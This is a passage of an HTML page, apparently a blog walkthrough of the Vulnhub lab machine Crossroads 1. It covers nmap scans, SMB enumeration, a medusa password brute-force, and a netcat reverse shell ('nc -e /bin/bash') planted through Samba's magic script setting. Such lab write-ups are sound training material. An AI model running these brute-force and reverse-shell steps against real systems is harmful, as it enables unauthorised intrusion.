@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Nikit Writeups</title>
+        <!-- Favicon-->
+        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+    </head>
+    <body id="page-top">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
+            <div class="container">
+                <a class="navbar-brand js-scroll-trigger" href="#page-top">Nikit Penkar</a>
+                <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="#solution">Solution</a></li>
+                        <li class="nav-item mx-0 mx-lg-1"><a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="/myblog/index.html">Back To Home</a></li>
+                        
+
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="bg-gradient-main">
+        <!-- Masthead-->
+            <header class="masthead  text-white text-center">
+                <div class="container d-flex align-items-center flex-column">
+                    <!-- Masthead Avatar Image-->
+                    <img class="masthead-avatar mb-5" src="assets/img/avataaars.svg" alt="" />
+                    <!-- Masthead Heading-->
+                    <h1 class="masthead-heading text-uppercase mb-0">Crossroads 1 Vulnhub Walkthrough</h1>
+                    <!-- Icon Divider-->
+                    <div class="divider-custom divider-light">
+                        <div class="divider-custom-line"></div>
+                        <div class="divider-custom-icon"><i class="fas fa-star"></i></div>
+                        <div class="divider-custom-line"></div>
+                    </div>
+                    <!-- Masthead Subheading-->
+                    <p class="masthead-subheading font-weight-light mb-0">
+                        Level : Beginner / Intermediate
+                    </p>
+                    <p class="masthead-subheading font-weight-light mt-2">
+                        Goal: Find user flag and root flag
+                    </p>
+                </div>
+            </header>
+        </div> 
+        <section class="page-section bgbody text-white mb-0" id="solution">
+            <div class="container">
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark">Summary</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        This is a writeup for the Vulnhub Machine - Crossroads:1 which was released by tasiyanci
+                    </div>
+                </div>
+                
+
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Machine Discovery</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        First we will use nmap -sn 192.168.0.0/24 to discover the machine in our network. (I have assigned an IP of 192.168.0.0/24 range to my machine)
+                    </div>
+                </div>
+
+                <div class="row justify-content-center">
+                    <!-- Portfolio Item 1-->
+                        <div class="col-md-6 col-lg-4">
+                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal51">
+                                
+                                <img class="img-fluid" src="assets/img/crossroads/1.png" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                    <div class="portfolio-modal modal fade" id="portfolioModal51" tabindex="-1" role="dialog" aria-labelledby="portfolioModal51Label" aria-hidden="true">
+                        <div class="modal-dialog modal-xl" role="document">
+                            <div class="modal-content">
+                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                </button>
+                                <div class="modal-body text-center">
+                                    <div class="container">
+                                        <div class="row justify-content-center">
+                                            <div class="col-lg-8">
+                                                
+                                                <!-- Portfolio Modal - Image-->
+                                                <img class="img-fluid rounded mb-5" src="assets/img/crossroads/1.png" alt="" />
+                                                
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                
+                
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Port Scanning</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        Once the machine is discovered, we will do a port scan using nmap
+                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                            nmap -A -T4 -p- 192.168.0.112   
+                        </p>                      
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                <!-- Portfolio Item 1-->
+                    <div class="col-md-6 col-lg-4">
+                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal1">
+                            
+                            <img class="img-fluid" src="assets/img/crossroads/2.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="portfolio-modal modal fade" id="portfolioModal1" tabindex="-1" role="dialog" aria-labelledby="portfolioModal1Label" aria-hidden="true">
+                    <div class="modal-dialog modal-xl" role="document">
+                        <div class="modal-content">
+                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                            </button>
+                            <div class="modal-body text-center">
+                                <div class="container">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8">
+                                            
+                                            <!-- Portfolio Modal - Image-->
+                                            <img class="img-fluid rounded mb-5" src="assets/img/crossroads/2.png" alt="" />
+                                            
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                    
+                <!--Section Heading-->
+                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Exploiting User Flag</h2>
+
+                <!--Section Content-->
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                        We can see that Port 80(HTTP), Port 139 and Port 445 (SMB) are open<br>
+                        We can try checking the website, but no luck on it<br>
+                        Next we can try enumerating the smb using SMBCLIENT<br>
+                        Keep the password blank
+                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                        smbclient -L \\\\192.168.0.112   
+                        </p>                      
+                    </div>
+                </div>
+                <div class="row justify-content-center">
+                <!-- Portfolio Item 1-->
+                    <div class="col-md-6 col-lg-4">
+                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal2">
+                            
+                            <img class="img-fluid" src="assets/img/crossroads/3.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="portfolio-modal modal fade" id="portfolioModal2" tabindex="-1" role="dialog" aria-labelledby="portfolioModal2Label" aria-hidden="true">
+                    <div class="modal-dialog modal-xl" role="document">
+                        <div class="modal-content">
+                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                            </button>
+                            <div class="modal-body text-center">
+                                <div class="container">
+                                    <div class="row justify-content-center">
+                                        <div class="col-lg-8">
+                                            
+                                            <!-- Portfolio Modal - Image-->
+                                            <img class="img-fluid rounded mb-5" src="assets/img/crossroads/3.png" alt="" />
+                                            
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                        We can see that there is a folder called smbshare<br>
+                        We will use enum4linux for more information about smb
+                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                            enum4linux 192.168.0.112
+                        </p>                      
+                    </div>
+                </div>
+
+                <div class="row justify-content-center">
+                    <!-- Portfolio Item 1-->
+                        <div class="col-md-6 col-lg-4">
+                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal3">
+                                
+                                <img class="img-fluid" src="assets/img/crossroads/4.png" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                    <div class="portfolio-modal modal fade" id="portfolioModal3" tabindex="-1" role="dialog" aria-labelledby="portfolioModal3Label" aria-hidden="true">
+                        <div class="modal-dialog modal-xl" role="document">
+                            <div class="modal-content">
+                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                </button>
+                                <div class="modal-body text-center">
+                                    <div class="container">
+                                        <div class="row justify-content-center">
+                                            <div class="col-lg-8">
+                                                
+                                                <!-- Portfolio Modal - Image-->
+                                                <img class="img-fluid rounded mb-5" src="assets/img/crossroads/4.png" alt="" />
+                                                
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row justify-content-center">
+                        <!-- Portfolio Item 1-->
+                            <div class="col-md-6 col-lg-4">
+                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal52">
+                                    
+                                    <img class="img-fluid" src="assets/img/crossroads/5.png" alt="" />
+                                </div>
+                            </div>
+                        </div>
+                        <div class="portfolio-modal modal fade" id="portfolioModal52" tabindex="-1" role="dialog" aria-labelledby="portfolioModal52Label" aria-hidden="true">
+                            <div class="modal-dialog modal-xl" role="document">
+                                <div class="modal-content">
+                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                    </button>
+                                    <div class="modal-body text-center">
+                                        <div class="container">
+                                            <div class="row justify-content-center">
+                                                <div class="col-lg-8">
+                                                    
+                                                    <!-- Portfolio Modal - Image-->
+                                                    <img class="img-fluid rounded mb-5" src="assets/img/crossroads/5.png" alt="" />
+                                                    
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+
+                    <div class="row">
+                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                            We found a user albert<br>
+                            Now we need to crack the password for albert. I have used medusa for this
+                            <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                medusa -h 192.168.0.112 -u ‘albert’ -P /usr/share/wordlists/rockyou.txt -M smbnt
+                            </p>                      
+                        </div>
+                    </div>
+                    
+                    <div class="row justify-content-center">
+                        <!-- Portfolio Item 1-->
+                            <div class="col-md-6 col-lg-4">
+                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal4">
+                                    
+                                    <img class="img-fluid" src="assets/img/crossroads/6.png" alt="" />
+                                </div> 
+                            </div>
+                        </div>
+                        <div class="portfolio-modal modal fade" id="portfolioModal4" tabindex="-1" role="dialog" aria-labelledby="portfolioModal4Label" aria-hidden="true">
+                            <div class="modal-dialog modal-xl" role="document">
+                                <div class="modal-content">
+                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                    </button>
+                                    <div class="modal-body text-center">
+                                        <div class="container">
+                                            <div class="row justify-content-center">
+                                                <div class="col-lg-8">
+                                                    
+                                                    <!-- Portfolio Modal - Image-->
+                                                    <img class="img-fluid rounded mb-5" src="assets/img/crossroads/6.png" alt="" />
+                                                    
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                       
+                        <div class="row justify-content-center">
+                        <!-- Portfolio Item 1-->
+                            <div class="col-md-6 col-lg-4">
+                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal53">
+                                    
+                                    <img class="img-fluid" src="assets/img/crossroads/7.png" alt="" />
+                                </div>
+                            </div>
+                        </div>
+                        <div class="portfolio-modal modal fade" id="portfolioModal53" tabindex="-1" role="dialog" aria-labelledby="portfolioModal53Label" aria-hidden="true">
+                            <div class="modal-dialog modal-xl" role="document">
+                                <div class="modal-content">
+                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                    </button>
+                                    <div class="modal-body text-center">
+                                        <div class="container">
+                                            <div class="row justify-content-center">
+                                                <div class="col-lg-8">
+                                                    
+                                                    <!-- Portfolio Modal - Image-->
+                                                    <img class="img-fluid rounded mb-5" src="assets/img/crossroads/7.png" alt="" />
+                                                    
+                                                    
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="row">
+                            <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                We found the password as bradley1<br>
+                                Now lets try to log in to smb with username albert and password bradley1<br>
+                                Use ls to list the files present
+                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                    smbclient //192.168.0.112/albert -U albert  
+                                </p>                      
+                            </div>
+                        </div>
+                        
+                        <div class="row justify-content-center">
+                            <!-- Portfolio Item 1-->
+                                <div class="col-md-6 col-lg-4">
+                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal5">
+                                        
+                                        <img class="img-fluid" src="assets/img/crossroads/8.png" alt="" />
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="portfolio-modal modal fade" id="portfolioModal5" tabindex="-1" role="dialog" aria-labelledby="portfolioModal5Label" aria-hidden="true">
+                                <div class="modal-dialog modal-xl" role="document">
+                                    <div class="modal-content">
+                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                        </button>
+                                        <div class="modal-body text-center">
+                                            <div class="container">
+                                                <div class="row justify-content-center">
+                                                    <div class="col-lg-8">
+                                                        
+                                                        <!-- Portfolio Modal - Image-->
+                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/8.png" alt="" />
+                                                        
+                                                        
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                    And we got our User Flag!<br>
+                                    Download the rest of files using get<br>
+                                    cd into the smbshare directory and download the smb.conf file  
+                                    </p>                      
+                                </div>
+                            </div>
+                            
+                            <div class="row justify-content-center">
+                                <!-- Portfolio Item 1-->
+                                    <div class="col-md-6 col-lg-4">
+                                        <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal6">
+                                            
+                                            <img class="img-fluid" src="assets/img/crossroads/9.png" alt="" />
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="portfolio-modal modal fade" id="portfolioModal6" tabindex="-1" role="dialog" aria-labelledby="portfolioModal6Label" aria-hidden="true">
+                                    <div class="modal-dialog modal-xl" role="document">
+                                        <div class="modal-content">
+                                            <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                            </button>
+                                            <div class="modal-body text-center">
+                                                <div class="container">
+                                                    <div class="row justify-content-center">
+                                                        <div class="col-lg-8">
+                                                            
+                                                            <!-- Portfolio Modal - Image-->
+                                                            <img class="img-fluid rounded mb-5" src="assets/img/crossroads/9.png" alt="" />
+                                                            
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row justify-content-center">
+                                    <!-- Portfolio Item 1-->
+                                        <div class="col-md-6 col-lg-4">
+                                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal54">
+                                                
+                                                <img class="img-fluid" src="assets/img/crossroads/10.png" alt="" />
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="portfolio-modal modal fade" id="portfolioModal54" tabindex="-1" role="dialog" aria-labelledby="portfolioModal54Label" aria-hidden="true">
+                                        <div class="modal-dialog modal-xl" role="document">
+                                            <div class="modal-content">
+                                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                </button>
+                                                <div class="modal-body text-center">
+                                                    <div class="container">
+                                                        <div class="row justify-content-center">
+                                                            <div class="col-lg-8">
+                                                                
+                                                                <!-- Portfolio Modal - Image-->
+                                                                <img class="img-fluid rounded mb-5" src="assets/img/crossroads/10.png" alt="" />
+                                                                
+                                                                
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>    
+
+
+                                <!--Section Heading-->
+                                <h2 class="page-section-heading text-left text-uppercase text-dark mt-5">Exploiting Root Flag</h2>    
+
+                                <div class="row">
+                                    <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                        We have a file named beroot, an image name crossroads.png, smb conf file and the user flag<br>
+                                        Lets open the smb.conf file and scroll to the end of the file<br>
+                                        We can see a magic script = smbscript.sh along with other details
+                                        <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                            cat smb.conf
+                                        </p>                      
+                                    </div>
+                                </div>
+                                
+                                <div class="row justify-content-center">
+                                    <!-- Portfolio Item 1-->
+                                        <div class="col-md-6 col-lg-4">
+                                            <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal7">
+                                                
+                                                <img class="img-fluid" src="assets/img/crossroads/11.png" alt="" />
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="portfolio-modal modal fade" id="portfolioModal7" tabindex="-1" role="dialog" aria-labelledby="portfolioModal7Label" aria-hidden="true">
+                                        <div class="modal-dialog modal-xl" role="document">
+                                            <div class="modal-content">
+                                                <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                    <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                </button>
+                                                <div class="modal-body text-center">
+                                                    <div class="container">
+                                                        <div class="row justify-content-center">
+                                                            <div class="col-lg-8">
+                                                                
+                                                                <!-- Portfolio Modal - Image-->
+                                                                <img class="img-fluid rounded mb-5" src="assets/img/crossroads/11.png" alt="" />
+                                                                
+                                                                
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <div class="row">
+                                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                            We will create our own smbscript.sh and we will write our netcat reverse shell code in it
+                                            <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                echo ‘nc -e /bin/bash 192.168.0.112 4444’ > smbscript.sh
+                                            </p>                      
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="row justify-content-center">
+                                        <!-- Portfolio Item 1-->
+                                            <div class="col-md-6 col-lg-4">
+                                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal8">
+                                                   
+                                                    <img class="img-fluid" src="assets/img/crossroads/12.png" alt="" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="portfolio-modal modal fade" id="portfolioModal8" tabindex="-1" role="dialog" aria-labelledby="portfolioModal8Label" aria-hidden="true">
+                                            <div class="modal-dialog modal-xl" role="document">
+                                                <div class="modal-content">
+                                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                    </button>
+                                                    <div class="modal-body text-center">
+                                                        <div class="container">
+                                                            <div class="row justify-content-center">
+                                                                <div class="col-lg-8">
+                                                                    
+                                                                    <!-- Portfolio Modal - Image-->
+                                                                    <img class="img-fluid rounded mb-5" src="assets/img/crossroads/12.png" alt="" />
+                                                                    
+                                                                   
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+
+                                        
+                                    <div class="row">
+                                        <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                            Change its permission to 777 and log in to smb with user albert and the path of smbshare
+                                            <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                smbclient //192.168.0.112/smbshare -U albert
+                                            </p>                      
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="row justify-content-center">
+                                        <!-- Portfolio Item 1-->
+                                            <div class="col-md-6 col-lg-4">
+                                                <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal9">
+                                                   
+                                                    <img class="img-fluid" src="assets/img/crossroads/13.png" alt="" />
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="portfolio-modal modal fade" id="portfolioModal9" tabindex="-1" role="dialog" aria-labelledby="portfolioModal9Label" aria-hidden="true">
+                                            <div class="modal-dialog modal-xl" role="document">
+                                                <div class="modal-content">
+                                                    <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                        <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                    </button>
+                                                    <div class="modal-body text-center">
+                                                        <div class="container">
+                                                            <div class="row justify-content-center">
+                                                                <div class="col-lg-8">
+                                                                    
+                                                                    <!-- Portfolio Modal - Image-->
+                                                                    <img class="img-fluid rounded mb-5" src="assets/img/crossroads/13.png" alt="" />
+                                                                    
+                                                                   
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="row">
+                                            <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                Open a nc reverse shell on your terminal and then upload the smbscript.sh file using put<br>
+                                                And we got our reverse shell!
+                                                <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                    nc -nvlp 4444
+                                                </p>                      
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal10">
+                                                       
+                                                        <img class="img-fluid" src="assets/img/crossroads/14.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal10" tabindex="-1" role="dialog" aria-labelledby="portfolioModal10Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/14.png" alt="" />
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+    
+
+                                            
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark ml-4 mt-2" >
+                                                    Change the terminal to bash using Python
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        python -c ‘import pty;pty.spawn(“/bin/bash”)’    
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal11">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/15.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal11" tabindex="-1" role="dialog" aria-labelledby="portfolioModal11Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/15.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>                        
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We will check for Sudo permissions for user albert
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        find / -type f -perm -4000 -exec ls -l {} ; 2>/dev/null   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal12">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/16.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal12" tabindex="-1" role="dialog" aria-labelledby="portfolioModal12Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/16.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We can see /beroot which we saw earlier in the smb<br>
+                                                    Lets open the beroot file using cat
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        cat beroot   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal13">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/17.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal13" tabindex="-1" role="dialog" aria-labelledby="portfolioModal13Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/17.png" alt="" />
+                                                                        
+                                                                        
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    We can see /bin/bash /root/beroot.sh which is the program to get root
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        ./beroot   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal14">
+                                                        
+                                                        <img class="img-fluid" src="assets/img/crossroads/18.png" alt="" />
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="portfolio-modal modal fade" id="portfolioModal14" tabindex="-1" role="dialog" aria-labelledby="portfolioModal14Label" aria-hidden="true">
+                                                <div class="modal-dialog modal-xl" role="document">
+                                                    <div class="modal-content">
+                                                        <button class="close" type="button" data-dismiss="modal" aria-label="Close">
+                                                            <span aria-hidden="true"><i class="fas fa-times"></i></span>
+                                                        </button>
+                                                        <div class="modal-body text-center">
+                                                            <div class="container">
+                                                                <div class="row justify-content-center">
+                                                                    <div class="col-lg-8">
+                                                                        
+                                                                        <!-- Portfolio Modal - Image-->
+                                                                        <img class="img-fluid rounded mb-5" src="assets/img/crossroads/18.png" alt="" />
+                                                                        
+                                                                       
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <!--Section Content-->
+                                            <div class="row">
+                                                <div class="text-left align-items-left"><p class="lead text-dark mt-5 ml-4" >
+                                                    If we try to execute the program, we need the root password to login<br>
+                                                    Lets go back to our Crossroads folder on our Attack Machine and examine crossroads.png<br>
+                                                    We can use stego tools to examine the .png file<br>
+                                                    I have used stegoveritas
+                                                    <p class="lead text-dark mt-2 text-left align-items-left font-weight-bold ml-4" >
+                                                        stegoveritas crossroads.png   
+                                                    </p>                      
+                                                </div>
+                                            </div>
+                                            <div class="row justify-content-center">
+                                            <!-- Portfolio Item 1-->
+                                                <div class="col-md-6 col-lg-4">
+                                                    <div class="portfolio-item mx-auto" data-toggle="modal" data-target="#portfolioModal15">
